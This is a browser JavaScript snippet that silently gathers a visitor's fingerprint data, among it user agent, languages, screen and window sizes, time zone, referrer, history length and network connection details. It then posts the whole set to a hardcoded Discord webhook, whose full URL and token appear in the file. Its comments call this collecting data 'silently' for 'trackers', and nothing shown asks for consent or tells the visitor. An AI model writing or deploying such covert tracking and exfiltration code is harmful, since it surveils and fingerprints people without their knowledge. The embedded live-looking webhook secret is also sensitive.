// Discord webhook URL
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1406107665939042345/s8XXhrjJOdg5xYp4bMx3MsYaMhPpD-AXxnt3uOMUCdIErtabNOP-1BUMDX6Js5gXYK7p';

// Collect data for all trackers silently
const data = {
    Permissions: {
        'navigator.permissions.query': typeof navigator.permissions?.query === 'function' ? 'Available' : 'Not Available',
        'navigator.canShare': typeof navigator.canShare === 'function' ? navigator.canShare({}) : 'Not Available'
    },
    Network: {
        'fetch': typeof fetch === 'function' ? 'Available' : 'Not Available',
        'XMLHttpRequest': typeof XMLHttpRequest === 'function' ? 'Available' : 'Not Available',
        'WebSocket': typeof WebSocket === 'function' ? 'Available' : 'Not Available',
        'EventSource': typeof EventSource === 'function' ? 'Available' : 'Not Available',
        'RTCPeerConnection': typeof RTCPeerConnection === 'function' ? 'Available' : 'Not Available',
        'WebTransport': typeof WebTransport === 'function' ? 'Available' : 'Not Available'
    },
    Fingerprint: {
        'User Agent': navigator.userAgent || 'Not Available',
        'Language': navigator.language || 'Not Available',
        'Languages': Array.isArray(navigator.languages) ? navigator.languages.join(', ') : 'Not Available',
        'Platform': navigator.platform || 'Not Available',
        'Hardware Concurrency': navigator.hardwareConcurrency || 'Not Available',
        'Device Memory': navigator.deviceMemory || 'Not Available',
        'Max Touch Points': navigator.maxTouchPoints || 'Not Available',
        'Vendor': navigator.vendor || 'Not Available',
        'Product': navigator.product || 'Not Available',
        'Do Not Track': navigator.doNotTrack || 'Not Available',
        'Cookie Enabled': navigator.cookieEnabled ? 'Yes' : 'No',
        'Plugins Count': navigator.plugins ? navigator.plugins.length : 'Not Available',
        'Mime Types Count': navigator.mimeTypes ? navigator.mimeTypes.length : 'Not Available',
        'Screen Width': screen.width || 'Not Available',
        'Screen Height': screen.height || 'Not Available',
        'Avail Width': screen.availWidth || 'Not Available',
        'Avail Height': screen.availHeight || 'Not Available',
        'Color Depth': screen.colorDepth || 'Not Available',
        'Pixel Depth': screen.pixelDepth || 'Not Available',
        'Orientation Type': screen.orientation?.type || 'Not Available',
        'Device Pixel Ratio': window.devicePixelRatio || 'Not Available',
        'Inner Width': window.innerWidth || 'Not Available',
        'Inner Height': window.innerHeight || 'Not Available',
        'Outer Width': window.outerWidth || 'Not Available',
        'Outer Height': window.outerHeight || 'Not Available',
        'Time Zone': Intl.DateTimeFormat().resolvedOptions().timeZone || 'Not Available'
    },
    Sensors: {
        'Battery Available': typeof navigator.getBattery === 'function' ? 'Available' : 'Not Available',
        'Charging': 'N/A (Silent)',
        'Level': 'N/A (Silent)'
    },
    Graphics: {
        'Canvas 2D': typeof document.createElement('canvas').getContext('2d') !== 'undefined' ? 'Available' : 'Not Available',
        'WebGL': typeof document.createElement('canvas').getContext('webgl') !== 'undefined' ? 'Available' : 'Not Available',
        'WebGL2': typeof document.createElement('canvas').getContext('webgl2') !== 'undefined' ? 'Available' : 'Not Available',
        'Offscreen Canvas': typeof OffscreenCanvas !== 'undefined' ? 'Available' : 'Not Available',
        'WebGPU': typeof navigator.gpu !== 'undefined' ? 'Available' : 'Not Available'
    },
    Storage: {
        'localStorage': typeof localStorage !== 'undefined' ? 'Available' : 'Not Available',
        'sessionStorage': typeof sessionStorage !== 'undefined' ? 'Available' : 'Not Available',
        'indexedDB': typeof indexedDB !== 'undefined' ? 'Available' : 'Not Available',
        'caches': typeof caches !== 'undefined' ? 'Available' : 'Not Available',
        'Cookies': document.cookie.length > 0 ? 'Enabled' : 'Not Enabled'
    },
    Workers: {
        'Worker': typeof Worker !== 'undefined' ? 'Available' : 'Not Available',
        'SharedWorker': typeof SharedWorker !== 'undefined' ? 'Available' : 'Not Available',
        'MessageChannel': typeof MessageChannel !== 'undefined' ? 'Available' : 'Not Available',
        'BroadcastChannel': typeof BroadcastChannel !== 'undefined' ? 'Available' : 'Not Available'
    },
    ServiceWorker: {
        'Service Worker': typeof navigator.serviceWorker !== 'undefined' ? 'Available' : 'Not Available'
    },
    Media: {
        'Media Capabilities': typeof navigator.mediaCapabilities !== 'undefined' ? 'Available' : 'Not Available',
        'Picture in Picture': document.pictureInPictureEnabled ? 'Enabled' : 'Not Enabled'
    },
    'WebCodecs/Streams': {
        'VideoDecoder': typeof VideoDecoder !== 'undefined' ? 'Available' : 'Not Available',
        'AudioDecoder': typeof AudioDecoder !== 'undefined' ? 'Available' : 'Not Available',
        'VideoEncoder': typeof VideoEncoder !== 'undefined' ? 'Available' : 'Not Available',
        'AudioEncoder': typeof AudioEncoder !== 'undefined' ? 'Available' : 'Not Available',
        'ImageDecoder': typeof ImageDecoder !== 'undefined' ? 'Available' : 'Not Available',
        'ReadableStream': typeof ReadableStream !== 'undefined' ? 'Available' : 'Not Available',
        'WritableStream': typeof WritableStream !== 'undefined' ? 'Available' : 'Not Available',
        'TransformStream': typeof TransformStream !== 'undefined' ? 'Available' : 'Not Available',
        'CompressionStream': typeof CompressionStream !== 'undefined' ? 'Available' : 'Not Available',
        'DecompressionStream': typeof DecompressionStream !== 'undefined' ? 'Available' : 'Not Available'
    },
    Observers: {
        'MutationObserver': typeof MutationObserver !== 'undefined' ? 'Available' : 'Not Available',
        'ResizeObserver': typeof ResizeObserver !== 'undefined' ? 'Available' : 'Not Available',
        'IntersectionObserver': typeof IntersectionObserver !== 'undefined' ? 'Available' : 'Not Available',
        'PerformanceObserver': typeof PerformanceObserver !== 'undefined' ? 'Available' : 'Not Available',
        'ReportingObserver': typeof ReportingObserver !== 'undefined' ? 'Available' : 'Not Available'
    },
    'Window/Doc': {
        'Referrer': document.referrer || 'Not Available',
        'Domain': document.domain || 'Not Available',
        'Visibility State': document.visibilityState || 'Not Available',
        'Has Focus': document.hasFocus() ? 'Yes' : 'No',
        'History Length': window.history.length || 'Not Available'
    },
    'Display Control': {
        'Fullscreen Enabled': document.fullscreenEnabled ? 'Yes' : 'Not Available'
    },
    Auth: {
        'WebAuthn Available': typeof PublicKeyCredential !== 'undefined' ? 'Yes' : 'No'
    },
    Files: {
        'DataTransfer': typeof DataTransfer !== 'undefined' ? 'Available' : 'Not Available'
    },
    'Other Devices': {
        'Gamepads': typeof navigator.getGamepads === 'function' ? 'Available' : 'Not Available',
        'SpeechSynthesis': typeof speechSynthesis !== 'undefined' ? 'Available' : 'Not Available'
    },
    Coordination: {
        'SharedArrayBuffer': typeof SharedArrayBuffer !== 'undefined' ? 'Available' : 'Not Available'
    },
    'Presentation/XR': {
        'Presentation': typeof PresentationRequest !== 'undefined' ? 'Available' : 'Not Available',
        'XR': typeof navigator.xr !== 'undefined' ? 'Available' : 'Not Available'
    },
    'URL & Encoding': {
        'btoa': typeof btoa !== 'undefined' ? 'Available' : 'Not Available',
        'atob': typeof atob !== 'undefined' ? 'Available' : 'Not Available',
        'TextEncoder': typeof TextEncoder !== 'undefined' ? 'Available' : 'Not Available',
        'TextDecoder': typeof TextDecoder !== 'undefined' ? 'Available' : 'Not Available'
    },
    Scripting: {
        'eval': typeof eval !== 'undefined' ? 'Available' : 'Not Available',
        'Function': typeof Function !== 'undefined' ? 'Available' : 'Not Available',
        'WebAssembly': typeof WebAssembly !== 'undefined' ? 'Available' : 'Not Available'
    },
    'EME (DRM)': {
        'MediaKeySystemAccess': typeof navigator.requestMediaKeySystemAccess !== 'undefined' ? 'Available' : 'Not Available'
    },
    'Events(document.addEventListener)': { 'Support': typeof document.addEventListener === 'function' ? 'Available' : 'Not Available' },
    'Events(window.addEventListener)': { 'Support': typeof window.addEventListener === 'function' ? 'Available' : 'Not Available' },
    'Events(element.addEventListener)': { 'Support': typeof document.createElement('div').addEventListener === 'function' ? 'Available' : 'Not Available' },
    'Permissions(names)': {
        'geolocation': typeof navigator.permissions?.query === 'function' ? 'Checkable' : 'Not Available',
        'notifications': typeof navigator.permissions?.query === 'function' ? 'Checkable' : 'Not Available',
        'camera': typeof navigator.permissions?.query === 'function' ? 'Checkable' : 'Not Available',
        'microphone': typeof navigator.permissions?.query === 'function' ? 'Checkable' : 'Not Available',
        'clipboard-read': typeof navigator.permissions?.query === 'function' ? 'Checkable' : 'Not Available',
        'clipboard-write': typeof navigator.permissions?.query === 'function' ? 'Checkable' : 'Not Available',
        'background-sync': typeof navigator.permissions?.query === 'function' ? 'Checkable' : 'Not Available',
        'ambient-light-sensor': typeof navigator.permissions?.query === 'function' ? 'Checkable' : 'Not Available',
        'accelerometer': typeof navigator.permissions?.query === 'function' ? 'Checkable' : 'Not Available',
        'gyroscope': typeof navigator.permissions?.query === 'function' ? 'Checkable' : 'Not Available',
        'magnetometer': typeof navigator.permissions?.query === 'function' ? 'Checkable' : 'Not Available',
        'midi': typeof navigator.permissions?.query === 'function' ? 'Checkable' : 'Not Available',
        'payment-handler': typeof navigator.permissions?.query === 'function' ? 'Checkable' : 'Not Available',
        'push': typeof navigator.permissions?.query === 'function' ? 'Checkable' : 'Not Available',
        'persistent-storage': typeof navigator.permissions?.query === 'function' ? 'Checkable' : 'Not Available',
        'nfc': typeof navigator.permissions?.query === 'function' ? 'Checkable' : 'Not Available',
        'idle-detection': typeof navigator.permissions?.query === 'function' ? 'Checkable' : 'Not Available',
        'storage-access': typeof navigator.permissions?.query === 'function' ? 'Checkable' : 'Not Available',
        'window-management': typeof navigator.permissions?.query === 'function' ? 'Checkable' : 'Not Available',
        'local-fonts': typeof navigator.permissions?.query === 'function' ? 'Checkable' : 'Not Available'
    },
    NetworkInformation: {
        'Connection': typeof navigator.connection !== 'undefined' ? 'Available' : 'Not Available',
        'Type': navigator.connection?.type || 'Unknown',
        'Effective Type': navigator.connection?.effectiveType || 'Unknown',
        'Downlink': navigator.connection?.downlink || 'Not Available',
        'RTT': navigator.connection?.rtt || 'Not Available',
        'Save Data': navigator.connection?.saveData ? 'Yes' : 'No'
    },
    MediaSessionActions: {
        'play': typeof navigator.mediaSession?.setActionHandler === 'function' ? 'Available' : 'Not Available',
        'pause': typeof navigator.mediaSession?.setActionHandler === 'function' ? 'Available' : 'Not Available',
        'seekbackward': typeof navigator.mediaSession?.setActionHandler === 'function' ? 'Available' : 'Not Available',
        'seekforward': typeof navigator.mediaSession?.setActionHandler === 'function' ? 'Available' : 'Not Available',
        'seekto': typeof navigator.mediaSession?.setActionHandler === 'function' ? 'Available' : 'Not Available',
        'stop': typeof navigator.mediaSession?.setActionHandler === 'function' ? 'Available' : 'Not Available',
        'previoustrack': typeof navigator.mediaSession?.setActionHandler === 'function' ? 'Available' : 'Not Available',
        'nexttrack': typeof navigator.mediaSession?.setActionHandler === 'function' ? 'Available' : 'Not Available',
        'skipad': typeof navigator.mediaSession?.setActionHandler === 'function' ? 'Available' : 'Not Available',
        'togglecamera': typeof navigator.mediaSession?.setActionHandler === 'function' ? 'Available' : 'Not Available',
        'togglemicrophone': typeof navigator.mediaSession?.setActionHandler === 'function' ? 'Available' : 'Not Available'
    },
    'MediaSessionActions (handlers)': {
        'Handler Support': typeof navigator.mediaSession?.setActionHandler === 'function' ? 'Available' : 'Not Available'
    },
    'CSS Feature/Fingerprint': {
        'CSS Supports': typeof CSS.supports === 'function' ? 'Available' : 'Not Available',
        'Prefers Color Scheme': window.matchMedia('(prefers-color-scheme: dark)').matches ? 'Dark' : 'Light',
        'Forced Colors': window.matchMedia('(forced-colors: active)').matches ? 'Active' : 'Inactive',
        'Reduced Motion': window.matchMedia('(prefers-reduced-motion: reduce)').matches ? 'Reduced' : 'Normal',
        'Inverted Colors': window.matchMedia('(inverted-colors: inverted)').matches ? 'Inverted' : 'Normal'
    },
    WebGPU: {
        'GPU': typeof navigator.gpu !== 'undefined' ? 'Available' : 'Not Available'
    },
    'Cross-Tab': {
        'BroadcastChannel': typeof BroadcastChannel !== 'undefined' ? 'Available' : 'Not Available'
    },
    Reporting: {
        'ReportingObserver': typeof ReportingObserver !== 'undefined' ? 'Available' : 'Not Available'
    }
};

// Format for Discord with bold headings and unbolded details
const embed = {
    content: 'Comprehensive Tracking Results',
    embeds: Object.entries(data).map(([category, items]) => ({
        title: `**${category}**`,
        description: Object.entries(items).map(([key, value]) => `${key}: ${value}`).join('\n'),
        color: 5814783
    }))
};

// Send to Discord webhook
fetch(WEBHOOK_URL, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify(embed)
}).catch(error => console.error('Error sending to webhook:', error));
